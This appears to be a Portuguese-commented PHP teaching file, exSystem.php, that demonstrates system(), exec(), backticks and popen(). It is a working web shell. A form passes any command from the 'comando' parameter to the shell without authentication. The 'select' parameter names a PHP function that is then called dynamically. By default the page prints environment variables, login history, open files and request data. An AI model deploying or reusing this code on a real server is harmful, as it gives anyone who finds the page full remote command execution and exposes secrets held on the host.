		<?php
			function exSystem($cmd, $retval){
				$str="<pre>";
				$last_line = system($cmd);
				/* executa o comando em $cmd e guarda a resposta em $last_line */
				$str.="<hr></hr>";
				$str.="<font color=\"Yellow\">>".$cmd."</font>";
				$str.="<hr></hr>";
				$str.="<br />".$last_line."<br />";
				$str.="<hr></hr>";
				$str.="<hr></hr>";
				$str.="<br />";
				return $str;
			}
			function execD($cmd){
				$str="<pre>";
				$last_line = exec($cmd);
					/* executa o comando em $cmd com exec e  guarda a resposta em $last_line */
				$str.="<hr></hr>";
				$str.="<font color=\"Yellow\">>".$cmd."</font>";
				$str.="<hr></hr>".$last_line;
				$str.="<hr></hr>";
				$str.="<hr></hr>";
				$str.="<br />";
				return $str;
			}
			function execD2($cmd){
				$str="<pre>";
				$last_line = `$cmd`;
					/* executa o comando em $cmd com o acento grave e  guarda a resposta em $last_line */
				$str.="<hr></hr>";
				$str.="<font color=\"Yellow\">>".$cmd."</font>";
				$str.="<hr></hr>".$last_line;
				$str.="<hr></hr>";
				$str.="<hr></hr>";
				$str.="<br />";
				return $str;
			}
			function execD9($cmd){
				error_reporting(E_ALL);
				/* Add redirection so we can get stderr. */
				$handle = popen($cmd, 'r');
				echo "'$handle'; " . gettype($handle) . "\n";
				$read = fread($handle, 2096);
				$str2 = $read;
				pclose($handle);
				$str="<pre>";
				$str.="<hr></hr>";
				$str.="<font color=\"Yellow\">>".$cmd."</font>";
				$str.="<hr></hr>".$str2;
				$str.="<hr></hr>";
				$str.="<hr></hr>";
				$str.="<br />";
				return $str;
			}
			function execD5($cmd, $fn){
				return $fn($cmd);
				/*chamo dinamicamente a função*/
			}
			function execD7()
			{
					$titulo="Exemplo simples de uso da função Systen";
					$doc = new DOMDocument();
					/* com DOM crio meu documento html*/
						$htmlantes="<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">";
						$htmlantes.="<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\" />";
						$htmlantes.="<title>".$titulo."</title></head>";
						$htmlantes.="<body>";
						$htmlantes.="<style type=\"text/css\">#titulo, #corpo{display:block;text-align:center;	}#titulo{background-color:black; color: red; border-bottom-color: #000000;border-top-color: #000000;border-left-color: #000000;border-right-color: #000000;font-weight:bolder;font-family:Comic Sans MS, Times New Roman, Charcoal,sans-serif;border-bottom: 2px solid;border-top: 2px solid;border-left: 2px solid;border-right: 2px solid;font-size:large;} #corpo{color:white; background-color: black; border-bottom-color: #FF0000;border-top-color: #FFA500;border-bottom: 2px solid;border-top: 2px solid;border-left: 2px solid;border-right: 2px solid;	border-left-color:#8B4513;	border-right-color: #8B4513;border-top-color:#8B4513;border-botton-color: #8B4513; text-align:left;	}</style>";
						$htmlantes.="<div id=\"titulo\">".$titulo."</div>";
						$htmlantes.="<div id=\"corpo\">";
						(isset($_REQUEST['comando'])&&isset($_REQUEST['select']))?$htmlantes.=execD5($_REQUEST['comando'], $_REQUEST['select']):$htmlantes.=(isset($_REQUEST['select']))?execD5("pwd ; file  exSystem.php; stat exSystem.php; date; printenv ; df; lspci; lsusb; last; lsof; whoami ; uptime", $_REQUEST['select']):execD5("pwd ; file  exSystem.php; stat exSystem.php; date; printenv ; df; lspci; lsusb; last; lsof; whoami ; uptime", "execD2");
						/* aqui acima verifico se existe comando no request e qual a função que desea-se que execute e chama a função com o comando desejado
						execD2("ls -lRa "."/home/\$USER/Documentos/")exSystem("ls -lRa ".escapeshellarg("/home/dm/Documentos/"), $retval)*/
						$htmlantes.="<div id=\"dv2\">"."</div>";
						$htmlantes.="<br />".print_r($_REQUEST, true);
						$htmlantes.="</div></body></html>";
					$doc->loadHTML($htmlantes);
					/*para o DOMDocument(); funcionar necessito ter todo o html então carrego o que não foi definido dinamicamenteo com o loadHTML($htmlantes);*/
						$dv2_2=$doc->createElement('div');
						/* crio uma div com DOM php, criará a <div> funciona semelhante ao DOM Javascript*/
						$dv2_2->setAttribute('id', 'dv2_2');
						$dv2_2->setAttribute('background', 'white');
						$inp1=$doc->createElement('input');
						$inp1->setAttribute('id', 'comando');
						$inp1->setAttribute('name', 'comando');
						$inp1->setAttribute('type', 'text');
						$inp1->setAttribute('size', '180');
						$inp1->setAttribute('maxLength', '180');
						$inp1->setAttribute('style', 'background-color:black; color: yellow; ');
						$dv2_2->appendChild($inp1);
						$btn1=$doc->createElement('input');
						$btn1->setAttribute('id', 'btn1');
						$btn1->setAttribute('type', 'submit');
						$btn1->setAttribute('value', 'executarNoLinux');
						$dv2_2->appendChild($btn1);
						$dv2=$doc->getElementById('dv2');
						$dv2->setAttribute('style', 'display:block;text-align:center; background-color:white; color: red; ');
						$form1=$doc->createElement('form');
						$form1->setAttribute('action', 'exSystem.php');

						$opt1=$doc->createElement('option');
						$label='execD2';
						$opt1->setAttribute('text', "$label");
						$opt1->setAttribute('value', "$label");
						$opt1->setAttribute('name', "$label");
						$opt1->appendChild( $doc->createTextNode("$label"));
						$opt2=$doc->createElement('option');
						$label='execD';
						$opt2->setAttribute('text', "$label");
						$opt2->setAttribute('value', "$label");
						$opt2->setAttribute('name', "$label");
						$opt2->appendChild( $doc->createTextNode("$label"));
						$opt3=$doc->createElement('option');
						$label='exSystem';
						$opt3->setAttribute('text', "$label");
						$opt3->setAttribute('value', "$label");
						$opt3->setAttribute('name', "$label");
						$opt3->appendChild( $doc->createTextNode("$label"));
						$opt4=$doc->createElement('option');
						$label='execD9';
						$opt4->setAttribute('text', "$label");
						$opt4->setAttribute('value', "$label");
						$opt4->setAttribute('name', "$label");
						$opt4->appendChild( $doc->createTextNode("$label"));
						$slct1=$doc->createElement('select');
						$slct1->appendChild( $opt1);
						$slct1->appendChild( $opt2);
						$slct1->appendChild( $opt3);
						$slct1->appendChild( $opt4);
						$slct1->setAttribute('name', "select");
						$dv2_2->appendChild( $slct1);
						$form1->appendChild( $dv2_2);
						$dv2->appendChild($form1);
					echo $doc->saveHTML();
					/*executo esse comando para saber se existem erros de php
					php -f "exSystem.php"*/
				}
				execD7();
				?>
